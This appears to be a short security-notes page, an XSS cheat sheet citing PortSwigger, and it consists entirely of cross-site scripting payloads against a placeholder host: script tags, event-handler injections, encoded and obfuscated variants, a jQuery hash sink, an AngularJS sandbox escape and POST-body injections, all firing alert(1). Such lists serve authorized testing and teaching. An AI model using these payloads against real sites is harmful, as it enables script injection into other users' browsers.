---
title: XSS Cheat Sheet
desc: Cheet Sheet for Cross Site Scripting.
tags: [Web, XSS]
alts: []
website: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
---

{% raw %}

```html
https://vulnerable.com/item?id=<script>alert(1)</script>
https://vulnerable.com/item?id="><script>alert(1)</script>
https://vulnerable.com/?search=<script>alert(1)</script>
https://vulnerable.com/?search="><script>alert(1)</script>
https://vulnerable.com/?search="><img src=1 onerror=alert(1)>
https://vulnerable.com/?search="><svg onload=alert(1)>
https://vulnerable.com/?search='></script><script>alert(1)</script>
https://vulnerable.com/?search="></span><img src=1 onerror=alert(1)>
https://vulnerable.com/?search=javascript:alert(1)
https://vulnerable.com/?search=\"-alert(1)//
https://vulnerable.com/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
https://vulnerable.com/?search=<a onmouseover=alert(1)>click</a>
https://vulnerable.com/?search=<img src="jav ascript:alert(1)">
https://vulnerable.com/?search=<img src="jav&#x09;ascript:alert(1)">
https://vulnerable.com/?search=<img src="jav&#x0A;ascript:alert(1)">
https://vulnerable.com/?search=&subparam=--><script>alert(1)</script>
https://vulnerable.com/example.php#value='><script>alert(1)</script>

<!-- jQuery -->
https://vulnerable.com/#<img src=1 onerror=alert(1)>
<iframe src="https://vulnerable.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">

<!-- AngulaJS (<html ng-app>) -->
https://vulnerable.com/?search={{$on.constructor('alert(1)')()}}

<!-- POST request body -->
postId=2&comment=<script>alert(1)</script>
postId=2&comment=<><img src=1 onerror=alert(1)>
postId=2&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
imageClass=" src=1 onerror=alert(1)>
imageClass=" onmouseleave='alert(1)'">
```

{% endraw %}